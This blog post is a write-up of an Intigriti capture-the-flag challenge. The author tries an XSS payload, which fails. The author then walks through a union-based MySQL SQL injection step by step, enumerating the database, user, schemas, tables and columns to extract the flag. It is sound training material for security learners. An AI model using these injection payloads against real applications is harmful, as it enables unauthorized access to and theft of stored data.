---
layout: post
title:  intigriti challenge 0926 2026 writeup
tags: [security,ctf]
---

well, it's an easy one.

## challenge 0926
When I see the new challenge, I think I should give it a try.  
The challenge is here. https://challenge-0926.challenges.intigriti.io/  

The solution says this. 
``` 
Shouldn't be self-XSS or related to MiTM attacks. 
The flag in the format INTIGRITI{.*}
```

At first sight, I didn't get it. Why is there a flag?

## xss
When we go to the challenge page, and click the page, we will see a param `pic`. It's base64 encoded. So I decode it with mytool https://m.tcp.im/base64/ .  
We get a `fox` value. And it's reflected on the page.  
So, my original thought is that it's a XSS challenge.  
And I choose the payload `lion <img src=1 onerror=aler(1)>` and base64 encoded it.
I fired the request. And NoScript blocked the request. And I think it's XSS.  
But when I let the request go, the payload in the page is encoded. So it's not an easy xss. It's just the xss payload blocked by NoScript.  
I tried several other XSS payloads. And no luck.

## sqli
So I tried `lion' or'1`  and it worked.  
So easy? Just a SQLi? No WAF? No bypass tricks?  

Test the `order by` with payload `lion' order by 1 -- a`. And it returned.  
Then I try to get some payloads with a cheat sheet. https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet These days, people just use sqlmap to do the work.  


`lion' union select 2 -- a`.  1 column and we can use `union`.  
`lion' union select database() -- a`.  Get the database. `critter_gallery`  

`lion' union select user() -- a`. Get the user. `gallery@10.18.53.240`  

`lion' union SELECT schema_name FROM information_schema.schemata -- a`. Get databases.

```
information_schema
performance_schema
critter_gallery
```


`lion' union SELECT concat(table_schema,table_name) FROM information_schema.tables WHERE table_schema != 'performance_schema' AND table_schema != 'information_schema' -- a`. Get tables. Interesting one. `secret_vault`

```
critter_galleryanimals
critter_gallerysecret_vault
```

`lion' union SELECT concat(table_schema, table_name, column_name ) FROM information_schema.columns WHERE table_schema != 'performance_schema' AND table_schema != 'information_schema' -- a` . Get columns.

```
critter_galleryanimalsdescription
critter_galleryanimalsid
critter_galleryanimalsname
critter_gallerysecret_vaultid
critter_gallerysecret_vaultnote
```

`lion' union SELECT concat(id,note) from secret_vault -- a`. Get the Flag.
`1INTIGRITI{01a***b2}`  

Yeah. It's a SQLi.

## conclusion
An easy SQLi with base64 encoded params.  
These days, it's not easy to find a SQLi. But you still need to know how to do SQLi.
